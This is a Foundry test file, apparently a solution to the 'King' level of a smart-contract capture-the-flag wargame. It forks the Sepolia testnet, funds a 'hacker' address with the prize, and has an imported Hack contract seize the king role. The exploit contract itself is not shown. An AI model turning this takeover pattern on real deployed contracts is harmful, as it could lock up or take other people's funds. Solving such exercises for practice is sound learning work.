//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import {Test} from "forge-std/Test.sol";
import {King, Hack} from "../src/level9.sol";
import {console} from "forge-std/console.sol";

contract level9Test is Test {
    King target;

    function setUp() public {
        vm.createSelectFork("SEPOLIA");
        address payable instanceAddress = payable(vm.envAddress("INSTANCE_AD"));
        target = King(payable(instanceAddress));
    }

    function testSolvesLeve9() public {
        uint256 prize = target.prize();
        console.log("prize: ", prize);
        address hacker = makeAddr("hacker");
        vm.deal(hacker, prize);
        vm.startPrank(hacker);
        Hack hackContract = new Hack(payable(address(target)));
        hackContract.hack{value: prize}();
        vm.stopPrank();
        assertTrue(target._king() == address(hackContract));
    }
}
//INSTANCE_AD=0xA25be1474200E484E240AF565573f8D4f3DDBc51 forge test --mt testSolvesLeve9 -vvv
